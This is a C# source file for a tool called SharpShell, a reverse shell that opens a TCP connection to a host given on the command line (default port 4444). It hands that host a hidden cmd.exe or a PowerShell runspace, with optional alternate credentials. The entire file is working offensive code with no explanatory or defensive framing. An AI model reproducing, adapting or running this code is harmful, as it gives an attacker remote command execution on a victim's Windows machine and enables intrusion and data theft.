using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Management;
using System.Management.Automation.Runspaces;
using System.Management.Automation;

namespace SharpShell
{
    public class Program
    {
        public static void Main(string[] args)
        {
            ParseArguments(args, out var isPS, out var port, out var host, out var user, out var pass, out var domain);

            if (string.IsNullOrEmpty(host))
            {
                ShowHelp();
                return;
            }

            using (var client = new TcpClient(host, port))
            {
                using (var stream = client.GetStream())
                {
                    if (!isPS)
                    {
                        using (var p = new Process())
                        {
                            var run = true;
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.Exited += new EventHandler((x, y) =>
                            {
                                run = false;
                            });
                            if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(user))
                            {
                                p.StartInfo.Domain = domain;
                                p.StartInfo.UserName = user;
                                var ssPwd = new System.Security.SecureString();
                                pass.ToList().ForEach(x => ssPwd.AppendChar(x));
                                pass = null; ;
                                p.StartInfo.Password = ssPwd;
                            }

                            p.Start();

                            var outTask = Task.Factory.StartNew(new Action(() =>
                            {
                                using (var streamWriter = new StreamWriter(stream))
                                {
                                    streamWriter.AutoFlush = true;
                                    while (run)
                                    {
                                        try
                                        {
                                            var c = char.ConvertFromUtf32(p.StandardOutput.Read());
                                            streamWriter.Write(c);
                                        }
                                        catch { run = client.Connected; }
                                    }
                                }
                            }), TaskCreationOptions.LongRunning);
                            var inTask = Task.Factory.StartNew(new Action(() =>
                            {
                                using (var rdr = new StreamReader(stream))
                                {
                                    rdr.BaseStream.ReadTimeout = 1000;
                                    while (run)
                                    {
                                        try
                                        {
                                            var line = rdr.ReadLine();
                                            p.StandardInput.WriteLine(line);
                                            p.StandardInput.Flush();
                                        }
                                        catch
                                        {
                                            run = client.Connected;
                                            if (!run)
                                            {
                                                GetChildProcesses(p).ToList().ForEach(c => { c.Kill(); });
                                                p.Kill();
                                                return;
                                            }
                                        }
                                    }
                                }
                            }), TaskCreationOptions.LongRunning);
                            var errTask = Task.Factory.StartNew(new Action(() =>
                            {
                                using (var streamWriter = new StreamWriter(stream))
                                {
                                    streamWriter.AutoFlush = true;
                                    while (run)
                                    {
                                        try
                                        {
                                            var c = char.ConvertFromUtf32(p.StandardError.Read());
                                            streamWriter.Write(c);
                                        }
                                        catch { run = client.Connected; }
                                    }
                                }
                            }), TaskCreationOptions.LongRunning);

                            Task.WaitAll(outTask, inTask, errTask);
                        }
                    }
                    else
                    {
                        using (var psi = PowerShell.Create())
                        using (var streamWriter = new StreamWriter(stream))
                        using (var rdr = new StreamReader(stream))
                        {
                            var prompt = "$>";
                            rdr.BaseStream.ReadTimeout = 1000;
                            var run = true;
                            streamWriter.AutoFlush = true;
                            streamWriter.Write($"{prompt}");

                            while (run)
                            {
                                var line = "";
                                try
                                {
                                    line = rdr.ReadLine();

                                    if(line.ToLower() == "exit" || line.ToLower() == "quit")
                                        return;

                                    if (!string.IsNullOrEmpty(line))
                                    {
                                        psi.AddScript(line);

                                        var output = psi.Invoke();

                                        foreach (var o in output)
                                        {
                                            if (o != null)
                                            {
                                                streamWriter.WriteLine($"{o.BaseObject.ToString()}");
                                            }
                                        }

                                        if (psi.Streams.Error.Count > 0)
                                        {
                                            psi.Streams.Error.ToList().ForEach(x => { streamWriter.WriteLine($"{x.ToString()}"); });
                                        }

                                    }

                                    streamWriter.Write($"{prompt}");
                                }
                                catch(Exception ex)
                                {
                                    run = client.Connected;
                                    if (!run)
                                        return;
                                }
                            }
                        }
                    }
                }
            }
        }

        private static IEnumerable<Process> GetChildProcesses(Process process)
        {
            var children = new List<Process>();
            using (var mos = new ManagementObjectSearcher(String.Format("Select * From Win32_Process Where ParentProcessID={0}", process.Id)))
            {
                foreach (var mo in mos.Get())
                {
                    var p = Process.GetProcessById(Convert.ToInt32(mo["ProcessID"]));
                    children.Add(p);
                    children.AddRange(GetChildProcesses(p));
                }
            }
            return children;
        }

        private static void ShowHelp()
        {
            Console.WriteLine("Usage: SharpShell.exe [-ps] -h <HOST> [-p PORT:4444] [-creds username password]");
        }

        private static void ParseArguments(string[] args, out bool isPS, out int port, out string host, out string user, out string pass, out string domain)
        {

            isPS = false;
            port = 4444;
            host = null;
            user = null;
            pass = null;
            domain = null;

            if ((args?.Length ?? 0) == 0)
                return;

            for (int i = 0; i < args.Length; i++)
            {
                var arg = args[i];
                if (arg == "-ps")
                    isPS = true;
                else if (arg == "-p" && args.Length > i && int.TryParse(args[i + 1], out var temp))
                    port = temp;
                else if (arg == "-h" && args.Length > i)
                    host = args[i + 1];
                else if (arg == "-creds" && args.Length > i + 1)
                {
                    var user_domain = args[i + 1];
                    if (user_domain.Contains("/"))
                    {
                        var split = user_domain.Split('/');
                        if (split.Length == 2)
                        {
                            domain = split[0];
                            user = split[1];
                        }
                    }
                    else
                        user = args[i + 1];

                    pass = args[i + 2];
                }
            }
        }
    }
}